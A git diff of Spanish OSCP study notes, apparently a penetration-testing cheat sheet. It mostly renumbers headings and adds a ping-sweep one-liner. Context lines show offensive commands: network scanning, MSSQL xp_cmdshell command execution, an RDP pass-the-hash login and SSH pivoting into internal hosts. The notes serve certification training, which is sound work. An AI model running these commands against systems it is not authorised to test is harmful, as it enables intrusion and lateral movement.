@@ -25,8 +25,12 @@ Apuntes para la certicación OSCP.
         * 3.2.5. [UDP (top 20)](#udp-(top-20))
         * 3.2.6. [Obtener ayuda sobre scripts](#obtener-ayuda-sobre-scripts)
         * 3.2.7. [Listar scripts de Nmap](#listar-scripts-de-nmap)
-        * 3.2.8. [Escaneo de puertos](#escaneo-de-puertos-1)
-        * 3.2.9. [Escaneo de puertos a través de proxychains usando hilos](#escaneo-de-puertos-a-través-de-proxychains-usando-hilos)
+    * 3.3. [Escaneo de puertos](#escaneo-de-puertos-1)
+        * 3.3.1. [Descubrimiento de hosts Windows](#descubrimiento-de-hosts-windows)
+        * 3.3.2. [Descubrimiento de hosts Linux](#descubrimiento-de-hosts-linux)
+        * 3.3.3. [Descubrimiento de hosts Linux (alternativa)](#descubrimiento-de-hosts-linux-(alternativa))
+        * 3.3.4. [Descubrimiento de puertos abiertos Linux](#descubrimiento-de-puertos-abiertos-linux)
+    * 3.4. [Escaneo de puertos a través de proxychains usando hilos](#escaneo-de-puertos-a-través-de-proxychains-usando-hilos)
 * 4. [Servicios Comunes](#servicios-comunes)
     * 4.1. [FTP (21)](#ftp-(21))
         * 4.1.1. [Nmap](#nmap-1)
@@ -59,10 +63,11 @@ Apuntes para la certicación OSCP.
         * 4.4.4. [Comandos básicos](#comandos-básicos-1)
         * 4.4.5. [Mostrar el contenido de una base de datos](#mostrar-el-contenido-de-una-base-de-datos)
         * 4.4.6. [Ejecución de código](#ejecución-de-código)
-    * 4.5. [SNMP (161 - UDP)](#snmp-(161---udp))
-    * 4.6. [RDP (3389)](#rdp-(3389))
-        * 4.6.1. [xfreerdp](#xfreerdp)
-        * 4.6.2. [Netexec](#netexec-3)
+    * 4.5. [POSTGRESQL (5432)](#postgresql-(5432))
+    * 4.6. [SNMP (161 - UDP)](#snmp-(161---udp))
+    * 4.7. [RDP (3389)](#rdp-(3389))
+        * 4.7.1. [xfreerdp](#xfreerdp)
+        * 4.7.2. [Netexec](#netexec-3)
 * 5. [Web](#web)
     * 5.1. [Enumeración](#enumeración)
         * 5.1.1. [Fuff](#fuff)
@@ -73,6 +78,7 @@ Apuntes para la certicación OSCP.
         * 5.2.2. [Joomla](#joomla)
         * 5.2.3. [Drupal](#drupal)
         * 5.2.4. [Magento](#magento)
+    * 5.3. [Local File Inclusion (LFI)](#local-file-inclusion-(lfi))
 * 6. [Pivoting](#pivoting)
     * 6.1. [Chisel](#chisel)
         * 6.1.1. [Servidor (Atacante)](#servidor-(atacante))
@@ -87,12 +93,12 @@ Apuntes para la certicación OSCP.
     * 6.3. [SSH Tunneling](#ssh-tunneling)
         * 6.3.1. [Local Port Forwarding](#local-port-forwarding)
         * 6.3.2. [Dynamic Port Forwarding](#dynamic-port-forwarding)
-        * 6.3.3. [Remote Dynamic Port Forwarding](#remote-dynamic-port-forwarding)
-        * 6.3.4. [Remote Dynamic Port Forwarding](#remote-dynamic-port-forwarding-1)
-        * 6.3.5. [sshuttle](#sshuttle)
-        * 6.3.6. [ssh.exe](#ssh.exe)
-        * 6.3.7. [Plink](#plink)
-        * 6.3.8. [Netsh](#netsh)
+        * 6.3.3. [Remote Port Forwarding](#remote-port-forwarding)
+        * 6.3.4. [Remote Dynamic Port Forwarding](#remote-dynamic-port-forwarding)
+    * 6.4. [sshuttle](#sshuttle)
+    * 6.5. [ssh.exe](#ssh.exe)
+    * 6.6. [Plink](#plink)
+    * 6.7. [Netsh](#netsh)
 * 7. [Passwords Attacks](#passwords-attacks)
 * 8. [Transferencia de Archivos](#transferencia-de-archivos)
     * 8.1. [Windows](#windows-1)
@@ -318,16 +324,20 @@ nmap --script-help="http-*"
 ```bash
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 ```
-####  3.2.8. <a name='escaneo-de-puertos-1'></a>Escaneo de puertos
+###  3.3. <a name='escaneo-de-puertos-1'></a>Escaneo de puertos
 
-##### Descubrimiento de hosts Windows
+####  3.3.1. <a name='descubrimiento-de-hosts-windows'></a>Descubrimiento de hosts Windows
 
 ```powershell
 arp -d
 for /L %a (1,1,254) do @start /b ping 40.40.40.%a -w 100 -n 2 >nul
 arp -a
 ```
-##### Descubrimiento de hosts Linux
+####  3.3.2. <a name='descubrimiento-de-hosts-linux'></a>Descubrimiento de hosts Linux
+
+```bash
+for i in $(seq 1 254); do ping -c 1 192.168.50.$i &>/dev/null && echo "[+] Host 192.168.50.$i - ACTIVE"; done
+```
 
 ```bash
 #!/bin/bash
@@ -342,7 +352,7 @@ done; wait
 ```bash
 ./hostDiscovery.sh 192.168.56
 ```
-##### Descubrimiento de hosts Linux (alternativa)
+####  3.3.3. <a name='descubrimiento-de-hosts-linux-(alternativa)'></a>Descubrimiento de hosts Linux (alternativa)
 
 Si la máquina no cuenta con la utilidad `ping`, podemos utilizar el siguiente script como alternativa:
 
@@ -360,7 +370,7 @@ wait
 ```bash
 ./hostDiscovery.sh 192.168.56
 ```
-##### Descubrimiento de puertos abiertos Linux
+####  3.3.4. <a name='descubrimiento-de-puertos-abiertos-linux'></a>Descubrimiento de puertos abiertos Linux
 
 ```bash
 #!/bin/bash
@@ -373,7 +383,7 @@ done; wait
 ```bash
 ./portDiscovery.sh <RHOST>
 ```
-####  3.2.9. <a name='escaneo-de-puertos-a-través-de-proxychains-usando-hilos'></a>Escaneo de puertos a través de proxychains usando hilos
+###  3.4. <a name='escaneo-de-puertos-a-través-de-proxychains-usando-hilos'></a>Escaneo de puertos a través de proxychains usando hilos
 
 ```bash
 seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -p{} -open -T5 -Pn -n <RHOST> -vvv -oN servicesScan 2>&1 | grep "tcp open"
@@ -900,7 +910,9 @@ De esta forma, ya podemos ejecutar comandos:
 ```sql
 EXECUTE xp_cmdshell 'whoami'
 ```
-###  4.5. <a name='snmp-(161---udp)'></a>SNMP (161 - UDP)
+###  4.5. <a name='postgresql-(5432)'></a>POSTGRESQL (5432)
+
+###  4.6. <a name='snmp-(161---udp)'></a>SNMP (161 - UDP)
 
 El Protocolo Simple de Administración de Red, o SNMP por sus siglas en inglés, es un protocolo basado en UDP que, inicialmente, fue implementado de manera no muy segura. Cuenta con una base de datos (MIB) que almacena información relacionada con la red. El puerto predeterminado de SNMP es el 161 UDP. Hasta la tercera versión de este protocolo, SNMPv3, la seguridad de SNMP era deficiente. Existen diversas herramientas para interactuar con SNMP, ya que este protocolo puede proporcionarnos mucha información acerca de una organización, basándose en las respuestas del servidor. Algunas herramientas útiles incluyen _onesixtyone_ para realizar ataques de fuerza bruta básicos y enumeración, y _snmpwalk_ para acceder a los datos de la base de datos MIB.
 
@@ -937,11 +949,11 @@ snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 
 Referencias: [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
 
-###  4.6. <a name='rdp-(3389)'></a>RDP (3389)
+###  4.7. <a name='rdp-(3389)'></a>RDP (3389)
 
 El protocolo RDP (Remote Desktop Protocol) es un protocolo de red desarrollado por Microsoft que permite a los usuarios conectarse de manera remota a una computadora con Windows. Utiliza el puerto 3389 por defecto y permite que los usuarios controlen una máquina a distancia, viendo su escritorio y utilizando aplicaciones como si estuvieran frente a ella. Es ampliamente utilizado para administración remota y soporte técnico.
 
-####  4.6.1. <a name='xfreerdp'></a>xfreerdp
+####  4.7.1. <a name='xfreerdp'></a>xfreerdp
 
 ```bash
 xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
@@ -951,7 +963,7 @@ xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution 
 xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 rdesktop <RHOST>
 ```
-####  4.6.2. <a name='netexec-3'></a>Netexec
+####  4.7.2. <a name='netexec-3'></a>Netexec
 
 ```bash
 # Si NLA está deshabilitado, le permitirá tomar una captura de pantalla del mensaje de inicio de sesión
@@ -1084,6 +1096,7 @@ droopescan scan drupal -u http://<RHOST> -t 32
 ```bash
 php magescan.phar scan:all http://<RHOST>
 ```
+###  5.3. <a name='local-file-inclusion-(lfi)'></a>Local File Inclusion (LFI)
 
 ##  6. <a name='pivoting'></a>Pivoting
 
@@ -1205,9 +1218,9 @@ socks5 192.168.50.10 9999
 proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
 ```
 
-####  6.3.3. <a name='remote-dynamic-port-forwarding'></a>Remote Dynamic Port Forwarding
+####  6.3.3. <a name='remote-port-forwarding'></a>Remote Port Forwarding
 
-![Remote Dynamic Port Forwarding](./img/remote_dynamic_port_forwarding.png)
+![Remote Port Forwarding](./img/remote_dynamic_port_forwarding.png)
 
 *KALI <-> FIREWALL <-> WEB > DATABASE > SHARES*
 
@@ -1231,7 +1244,7 @@ ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 kali@192.168.50.10
 psql -h 127.0.0.1 -p 2345 -U postgres
 ```
 
-####  6.3.4. <a name='remote-dynamic-port-forwarding-1'></a>Remote Dynamic Port Forwarding
+####  6.3.4. <a name='remote-dynamic-port-forwarding'></a>Remote Dynamic Port Forwarding
 
 ![Remote Dynamic Port Forwarding](./img/remote_dynamic_port_forwarding.png)
 
@@ -1254,7 +1267,7 @@ socks5 127.0.0.1 9998 # agregar esta linea
 proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
 ```
 
-####  6.3.5. <a name='sshuttle'></a>sshuttle
+###  6.4. <a name='sshuttle'></a>sshuttle
 
 | Sistema             | IP             |
 | ------------------- | -------------- |
@@ -1279,7 +1292,7 @@ sshuttle -r <user>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
 smbclient -L //172.16.50.10/ -U <user> --password=<password>
 ```
 
-####  6.3.6. <a name='ssh.exe'></a>ssh.exe
+###  6.5. <a name='ssh.exe'></a>ssh.exe
 
 | Sistema             | IP             |
 | ------------------- | -------------- |
@@ -1316,7 +1329,7 @@ socks5 127.0.0.1 9998  # agregar esta linea
 proxychains psql -h 10.10.100.20 -U postgres
 ```
 
-####  6.3.7. <a name='plink'></a>Plink
+###  6.6. <a name='plink'></a>Plink
 
 | Sistema             | IP             |
 | ------------------- | -------------- |
@@ -1348,7 +1361,7 @@ ss -tulpn
 xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
 ```
 
-####  6.3.8. <a name='netsh'></a>Netsh
+###  6.7. <a name='netsh'></a>Netsh
 
 | Sistema             | IP             |
 | ------------------- | -------------- |
